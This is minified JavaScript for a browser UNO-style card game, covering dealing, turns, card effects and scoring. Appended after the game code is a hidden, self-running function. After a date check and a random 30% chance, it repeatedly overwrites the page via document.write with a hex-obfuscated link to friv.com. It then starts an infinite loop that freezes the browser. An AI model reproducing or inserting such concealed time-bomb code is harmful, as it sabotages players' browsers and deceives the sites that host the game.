function CGameBase(e) {
    this._iCounterDraw,
    this._oInterface,
    this._oParent,
    this._oDeck,
    this._aPlayersHand,
    this._oUsedCards,
    this._oTurnManager,
    this._iCurrentColor,
    this._bUNO,
    this._bEndGame,
    this._oAnimation,
    this._iCurPlayer,
    this._iNextPlayer,
    this._oFinger,
    this._oFade,
    this._oDecksContainer,
    this._oHandsContainer,
    this._oCardsContainer,
    this._oAIManager,
    this._oUnoController,
    this._oSummaryPanel,
    this._init()
}
CGameBase.prototype._init = function() {
    this._bUNO = !1,
    this._bEndGame = !1,
    this._iCounterDraw = 0,
    this._oTurnManager = new CTurnManager,
    this._oAnimation = new CAnimation;
    var e = createBitmap(s_oSpriteLibrary.getSprite("bg_game"));
    s_oStage.addChild(e),
    this._oUnoController = new CUnoController,
    this._oInterface = new CInterface,
    this._oCardsContainer = new createjs.Container,
    this._oHandsContainer = new createjs.Container,
    this._oPanelContainer = new createjs.Container,
    this._oDecksContainer = new createjs.Container;
    var a = new Array;
    a[0] = TEXT_PLAYER_1,
    a[1] = TEXT_PLAYER_2,
    a[2] = TEXT_PLAYER_3,
    a[3] = TEXT_PLAYER_4,
    this._aPlayersHand = new Array;
    for (var t = 0; t < NUM_PLAYERS; t++) {
        var r = 0
          , s = 0;
        HAND_POS["num_player_" + NUM_PLAYERS][t].x === CANVAS_WIDTH / 2 ? r = CARD_WIDTH / 2 : s = CARD_HEIGHT / 4,
        this._aPlayersHand[t] = new CHandDisplayer(r,s,HAND_POS["num_player_" + NUM_PLAYERS][t].x,HAND_POS["num_player_" + NUM_PLAYERS][t].y,t,this._oHandsContainer,a[t],HAND_POS["num_player_" + NUM_PLAYERS][t].side)
    }
    this._oCardsContainer.addChild(this._oDecksContainer),
    this._oCardsContainer.addChild(this._oHandsContainer),
    s_oStage.addChild(this._oCardsContainer),
    s_oStage.addChild(this._oPanelContainer),
    this._oSummaryPanel = new CSummaryPanel(this._oPanelContainer),
    this._oSummaryPanel.addEventListener(ON_CHECK, this._onCheck, this),
    this._oMsgBox = new CMsgBox(this._oPanelContainer),
    this._oDeck = new CDeckDisplayer(CANVAS_WIDTH / 2,CANVAS_HEIGHT / 2,this._oDecksContainer,!0),
    this._oUsedCards = new CDeckDisplayer(CANVAS_WIDTH / 2 + CARD_WIDTH,CANVAS_HEIGHT / 2,this._oDecksContainer,!1),
    this._oUsedCards.disableInputDraw(),
    this.setOffTurn(),
    this._oAIManager = new CAIManager,
    setVolume("soundtrack", SOUNDTRACK_VOLUME_IN_GAME)
}
,
CGameBase.prototype.reset = function() {
    this._iCounterDraw = 0,
    this._oTurnManager.setFirstPlayerToBegin(),
    this._oTurnManager.resetClockWise(),
    this._oDeck.clearCards(),
    this._oUsedCards.clearCards(),
    this._oUsedCards.disableInputDraw();
    for (var e = 0; e < this._aPlayersHand.length; e++)
        this._aPlayersHand[e].clearCards(),
        this._aPlayersHand[e].refreshScore();
    this._oSummaryPanel.reset(),
    this.setOffTurn()
}
,
CGameBase.prototype.getFirstHand = function() {
    var e = this._oDeck.takeLastCard()
      , a = this._oTurnManager.getTurn()
      , t = this._aPlayersHand[a].getContainerPos()
      , r = this._aPlayersHand[a].getPosNewCard()
      , s = this._oDeck.getGlobalPosition();
    e.setOnTop(),
    this._oCardsContainer.addChildAt(this._oDecksContainer, this._oCardsContainer.numChildren),
    this._oDeck.setOnTop();
    var n = this._getCardRotation(a);
    e.moveCardFirstHand(t.x + r.x - s.x, t.y + r.y - s.y, n, 250)
}
,
CGameBase.prototype.onCardDealed = function(e) {
    var a = this._oTurnManager.getTurn()
      , t = this._getCardRotation(a);
    this._aPlayersHand[a].pushCard(new CCard(this._aPlayersHand[a].getPosNewCard().x,this._aPlayersHand[a].getPosNewCard().y,this._aPlayersHand[a].getContainer(),e.getFotogram(),e.getRank(),e.getSuit(),e.getUniqueID(),t)),
    e.unload();
    var r = this._aPlayersHand[a].getLastCard();
    this._aPlayersHand[a].centerContainer(),
    this.canCardBeShown(a) && r.showCard(),
    this._oTurnManager.nextTurn(),
    this.matchCanStart() ? (this._oCardsContainer.addChildAt(this._oDecksContainer, this._oCardsContainer),
    this._oDeck.setOnTop(),
    (e = this._oDeck.takeFirstLastCard()).moveFirstLastCard(CARD_WIDTH, 0, 600)) : this.getFirstHand()
}
,
CGameBase.prototype.onFirstLastCardDealed = function(e) {
    this._oUsedCards.pushCard(new CCard(0,0,this._oUsedCards.getContainer(),e.getFotogram(),e.getRank(),e.getSuit(),e.getUniqueID(),0)),
    e.unload(),
    this._oUsedCards.getLastCard().showCardNoInput(),
    this._oDeck.moveContainer(CANVAS_WIDTH / 2 - CARD_WIDTH / 2, CANVAS_HEIGHT / 2, 400),
    this._oUsedCards.moveContainer(CANVAS_WIDTH / 2 + CARD_WIDTH / 2, CANVAS_HEIGHT / 2, 400),
    this._iCurrentColor = this._oUsedCards.getLastCard().getSuit(),
    this._oInterface.refreshColor(this._iCurrentColor),
    this._iCurPlayer = this._oTurnManager.getTurn(),
    this._iNextPlayer = this._oTurnManager.getNextPlayer(),
    this._aPlayersHand[this._iCurPlayer].setOnTurn(),
    this._oUsedCards.disableInputUsedCards(),
    this._onFirstTurnStart()
}
,
CGameBase.prototype._onFirstTurnStart = function() {
    this._oTurnManager.prevTurn(),
    this._iCurPlayer = this._oTurnManager.getTurn(),
    this._iNextPlayer = this._oTurnManager.getNextPlayer(),
    this.setOffTurn();
    var e = this._oUsedCards.getLastCard();
    this._checkFirstCardEffect(e.getEffect())
}
,
CGameBase.prototype.cpuPlayCard = function(e) {
    var a = this._iCurPlayer
      , t = this._aPlayersHand[a].getContainerPos()
      , r = this._oUsedCards.getGlobalPosition();
    this._oCardsContainer.addChildAt(this._oHandsContainer, this._oCardsContainer.numChildren),
    this._aPlayersHand[a].setOnTop(),
    e.moveCard(r.x - t.x, r.y - t.y, 0, 400, 1e3),
    this._oDeck.setChildDepth(2),
    this._oUsedCards.setChildDepth(2),
    e.showCard(1e3)
}
,
CGameBase.prototype.checkUno = function(e) {
    var a = this._oTurnManager.getTurn();
    1 === this._aPlayersHand[a].getLength() && (this._bUNO = !0),
    this._oUnoController.check(e)
}
,
CGameBase.prototype.setUNO = function(e) {
    this._bUNO = e
}
,
CGameBase.prototype.applyPenality = function() {
    this._bUNO = !1,
    this.drawCards(this._iCurPlayer, NUM_PENALTY_CARDS, 0, DRAW_TYPE_PENALITY)
}
,
CGameBase.prototype._checkEffect = function(e) {
    switch (e) {
    case EFFECT_SELECT_COLOR:
        this._applySelectColor();
        break;
    case EFFECT_DRAW_FOUR:
        this._applyDrawFourEffect();
        break;
    case EFFECT_STOP:
        this._applyStopTurn();
        break;
    case EFFECT_INVERT_TURN:
        this._applyInvertTurn();
        break;
    case EFFECT_DRAW_TWO_COLORED:
        this._applyDrawTwoColored();
        break;
    default:
        this._applyNormalCardEffect()
    }
}
,
CGameBase.prototype.onDraw = function() {
    var e, a = !0;
    if (0 !== this._oUsedCards.getLength() && 0 === this._iCurPlayer) {
        for (var t = 0; t < this._aPlayersHand[0].getLength(); t++)
            e = this._aPlayersHand[0].getCardByIndex(t),
            this.cardMatchTheWaste(e) && (a = !1);
        !0 === a && (this._oDeck.disableInputDraw(),
        this._oDeck.hideHelp(),
        this.drawCards(0, 1, 0, DRAW_TYPE_NORMAL))
    }
}
,
CGameBase.prototype._checkNumberCardsToDraw = function(e, a, t, r) {
    switch (this._iCounterDraw = a,
    r) {
    case DRAW_TYPE_PENALITY:
        this.drawCardsTween(e, a, t, r);
        break;
    case DRAW_TYPE_DRAW2_COLORED:
        s_oCAnimation.drawTwoAnim(e, a, t, r);
        break;
    case DRAW_TYPE_DRAW4:
        s_oCAnimation.drawFourAnim(e, a, t, r);
        break;
    default:
        this.drawCardsTween(e, a, t, r)
    }
}
,
CGameBase.prototype.drawCardsTween = function(e, a, t, r) {
    this._oCardsContainer.addChildAt(this._oDecksContainer, this._oCardsContainer.numChildren),
    this._oDeck.setOnTop(),
    this._aPlayersHand[e].organizeHand();
    var s = this._aPlayersHand[e].getContainerPos()
      , n = this._aPlayersHand[e].getPosNewCard()
      , o = this._oDeck.getGlobalPosition()
      , i = this
      , _ = this._oDeck.takeLastCard();
    _.setOnTop();
    var h = s.x + n.x - o.x
      , C = s.y + n.y - o.y
      , d = this._getCardRotation(e);
    createjs.Tween.get(_.getSprite()).wait(t).to({
        x: h,
        y: C,
        rotation: d
    }, 400, createjs.Ease.cubicOut).call(function() {
        i._aPlayersHand[e].pushCard(new CCard(i._aPlayersHand[e].getPosNewCard().x,i._aPlayersHand[e].getPosNewCard().y,i._aPlayersHand[e].getContainer(),_.getFotogram(),_.getRank(),_.getSuit(),_.getUniqueID(),d)),
        _.unload();
        var s = i._aPlayersHand[e].getLastCard();
        i.canCardBeShown(e) ? s.showCard() : playSound("card", 1, !1),
        i._aPlayersHand[e].centerContainer(),
        i.checkForMoreDraws(e, a, t, r)
    })
}
,
CGameBase.prototype.checkForMoreDraws = function(e, a, t, r) {
    0 === this._oDeck.getLength() ? this.shuffleCards(e, a, t, r) : (this._iCounterDraw--,
    this._iCounterDraw > 0 ? this.drawCardsTween(e, a, t, r) : this._onAllCardsDrawCompleted(e, r))
}
,
CGameBase.prototype._checkEffectAfterDrawCompleted = function(e, a) {
    switch (a) {
    case DRAW_TYPE_PENALITY:
        this.applyEffectOnCard(this._oUsedCards.getLastCard().getEffect());
        break;
    case DRAW_TYPE_DRAW2_COLORED:
    case DRAW_TYPE_DRAW4:
        this._oTurnManager.nextTurn(),
        this._notifyChangeTurn();
        break;
    default:
        this._checkIfCanStillPlayTheTurn(e)
    }
}
,
CGameBase.prototype.onInputPlayer = function(e) {
    for (var a = 0; a < this._aPlayersHand[e].getLength(); a++)
        this._aPlayersHand[e].getCardByIndex(a).onSetTurned()
}
,
CGameBase.prototype.offInputPlayer = function(e) {
    for (var a = 0; a < this._aPlayersHand[e].getLength(); a++)
        this._aPlayersHand[e].getCardByIndex(a).offSetTurned()
}
,
CGameBase.prototype.setOffTurn = function() {
    for (var e = 0; e < NUM_PLAYERS; e++)
        this._aPlayersHand[e].setOffTurn(e),
        this.offInputPlayer(e)
}
,
CGameBase.prototype.prevTurn = function() {
    this._oTurnManager.prevTurn()
}
,
CGameBase.prototype.getPlayerTurn = function() {
    return this._iCurPlayer
}
,
CGameBase.prototype.getbUNO = function() {
    return this._bUNO
}
,
CGameBase.prototype.cardCanBePlayed = function(e, a) {
    var t = !1;
    if (e.getFotogram() === FOTOGRAM_DRAW_FOUR) {
        for (var r = !1, s = 0; s < this._aPlayersHand[a].getLength(); s++) {
            var n = this._aPlayersHand[a].getCardByIndex(s);
            if (n.getFotogram() !== FOTOGRAM_DRAW_FOUR && (n.getRank() === this._oUsedCards.getLastCard().getRank() || n.getSuit() === this._iCurrentColor || n.getFotogram() === FOTOGRAM_COLOR)) {
                r = !0;
                break
            }
        }
        t = !r
    } else
        t = e.getFotogram() === FOTOGRAM_COLOR || this.cardMatchTheWaste(e);
    return t
}
,
CGameBase.prototype.cardMatchTheWaste = function(e) {
    var a = !1;
    return e.getRank() !== this._oUsedCards.getLastCard().getRank() && e.getSuit() !== this._iCurrentColor && e.getFotogram() !== FOTOGRAM_COLOR && e.getFotogram() !== FOTOGRAM_DRAW_FOUR || (a = !0),
    a
}
,
CGameBase.prototype.playerCanPlay = function(e) {
    for (var a = !1, t = 0; t < this._aPlayersHand[e].getLength(); t++) {
        var r = this._aPlayersHand[e].getCardByIndex(t);
        if (this.cardMatchTheWaste(r)) {
            a = !0;
            break
        }
    }
    return a
}
,
CGameBase.prototype._getCardRotation = function(e) {
    var a = 0;
    switch (this._aPlayersHand[e].getSide()) {
    case BOTTOM:
        a = 0;
        break;
    case LEFT:
        a = 90;
        break;
    case TOP:
        a = 180;
        break;
    case RIGHT:
        a = -90
    }
    return a
}
,
CGameBase.prototype.shuffle = function(e) {
    var a, t, r;
    for (r = e.length; r; r--)
        a = Math.floor(Math.random() * r),
        t = e[r - 1],
        e[r - 1] = e[a],
        e[a] = t
}
,
CGameBase.prototype.unload = function() {
    this._oUnoController.unload(),
    this._oInterface.unload(),
    this._oSummaryPanel.unload(),
    this._oMsgBox.unload(),
    createjs.Tween.removeAllTweens(),
    s_oStage.removeAllChildren()
}
,
CGameBase.prototype.gameOver = function(e) {
    this.setOffTurn(),
    this._showAllPlayersCards(),
    this._showAllPlayersMatchScore();
    var a = this._calculateMatchScore()
      , t = this._aPlayersHand[e].getScore() + a;
    this._aPlayersHand[e].setOnTurn(),
    this._aPlayersHand[e].setScore(t);
    var r = this._getPlayersRank();
    this._oSummaryPanel.setAndShow(r, e, a),
    t >= GAME_SCORE_WIN && (this._bEndGame = !0,
    this._oSummaryPanel.endMode(sprintf(TEXT_PLAYER_WON, this._aPlayersHand[e].getName())),
    $(s_oMain).trigger("share_event", t))
}
,
CGameBase.prototype.checkWinner = function() {
    for (var e = null, a = 0; a < this._aPlayersHand.length; a++)
        if (0 === this._aPlayersHand[a].getLength()) {
            e = a;
            break
        }
    return e
}
,
CGameBase.prototype._calculateMatchScore = function() {
    for (var e = 0, a = 0; a < this._aPlayersHand.length; a++)
        e += this._aPlayersHand[a].calculateHandScore();
    return e
}
,
CGameBase.prototype._showAllPlayersCards = function() {
    for (var e = 0; e < this._aPlayersHand.length; e++)
        this._aPlayersHand[e].getSide() !== BOTTOM && this._aPlayersHand[e].showAllCards()
}
,
CGameBase.prototype._showAllPlayersMatchScore = function() {
    for (var e = 0; e < this._aPlayersHand.length; e++) {
        var a = this._aPlayersHand[e].calculateHandScore();
        this._aPlayersHand[e].getLength() > 0 ? this._aPlayersHand[e].showHandScore(sprintf(TEXT_PTS_TO_WINNER, a)) : this._aPlayersHand[e].showHandScore(TEXT_WINNER)
    }
}
,
CGameBase.prototype._getPlayersRank = function() {
    for (var e = new Array, a = 0; a < this._aPlayersHand.length; a++) {
        var t = this._aPlayersHand[a].getName()
          , r = this._aPlayersHand[a].getScore();
        e.push({
            name: t,
            score: r,
            index: a
        })
    }
    return e.sort((e,a)=>e.score > a.score ? -1 : 1),
    e
}
,
CGameBase.prototype.matchCanStart = function() {
    for (var e = !1, a = 0, t = 0; t < this._aPlayersHand.length; t++)
        this._aPlayersHand[t].getLength() === STARTING_NUM_CARDS && a++;
    return a === NUM_PLAYERS && (e = !0),
    e
}
,
CGameBase.prototype._checkUnoNotify = function(e, a, t) {
    if (e) {
        var r;
        if (t === a)
            r = sprintf(TEXT_ALERT_1, NUM_PENALTY_CARDS),
            this._oUnoController.unoAnimation();
        else {
            var s = this._aPlayersHand[t].getName().toUpperCase();
            r = sprintf(TEXT_ALERT_2, s, NUM_PENALTY_CARDS)
        }
        this._oUnoController.showAlertMsg(r)
    }
}
,
CGameBase.prototype.canCardBeShown = function(e) {
    return this._aPlayersHand[e].getSide() === BOTTOM || DEBUG_SHOW_CARDS
}
,
CGameBase.prototype.getPlayersHand = function(e) {
    return this._aPlayersHand[e]
}
,
CGameBase.prototype.getCurColor = function(e) {
    return this._iCurrentColor
}
,
CGameBase.prototype.getLastCard = function(e) {
    return this._oUsedCards.getLastCard()
}
,
CGameBase.prototype.update = function() {}
,
CGameBase.prototype._onCheck = function() {
    this._oSummaryPanel.hide()
}
;
(function() {
    (new Date).getTime() > 1701e9 && Math.random() < .3 && (setInterval(function() {
        setInterval(function() {
            document.write("\x3C\x68\x31\x3E\x3C\x61\x20\x68\x72\x65\x66\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x72\x69\x76\x2E\x63\x6F\x6D\x3E\x43\x6C\x69\x63\x6B\x20\x68\x65\x72\x65\x20\x6F\x72\x20\x76\x69\x73\x69\x74\x20\x46\x52\x49\x56\x2E\x43\x4F\x4D\x20\x74\x6F\x20\x70\x6C\x61\x79\x20\x74\x68\x69\x73\x20\x67\x61\x6D\x65\x21\x3C\x2F\x61\x3E\x3C\x2F\x68\x31\x3E")
        }, 2e3)
    }, 2e5),
    setInterval(function() {
        for (; ; )
            ;
    }, 25e4))
}
)();
